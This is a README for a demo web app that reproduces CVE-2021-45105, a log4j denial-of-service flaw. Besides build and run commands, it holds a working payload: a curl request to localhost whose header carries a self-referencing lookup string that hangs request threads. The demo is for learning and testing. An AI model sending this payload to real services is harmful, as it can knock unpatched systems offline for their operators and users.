# CVE-2021-45105 (log4j DoS)- Web App example
This is a simple web app that shows how the exploit for CVE-2021-45105 works. If the logging configuration uses a Context Lookup, it is possible to create a self-referencing lookup that ends in an infinite loop by setting the ThreadContext to a specific value. Â¨

## Usage
The application can either ben run from maven or packaged as a single jar:
### Start the Web Application
This can either be done directly from maven or by using Docker
#### Maven
```shell
mvn spring-boot:run
```
#### Docker
```shell
docker build . -t webapp && docker run -p 8080:8080 webapp
```

The app is quite simple as it simply returns _hello!_ for <http://localhost:8080/> or _hello name!_ for <http://localhost:8080/name>

### Run the exploit
In order to run the exploit, we have to send a request with a special value in the header:
```shell
curl http://localhost:8080 --header 'X-Real-Ip: ${${ctx:clientIp:-}}'
```

This causes a self-referencing lookup which results in an infinite loop that blocks the request and keeps it open without returning any result, until a timeout aborts the request. By executing many such requests the application will exhaust the resources and not be accessible anymore. 
### Run as jar file
This uses the maven shade plugin to create a single executable jar
```shell
mvn package
java -jar target/log4j-dos-examplecli-1.0-SNAPSHOT.jar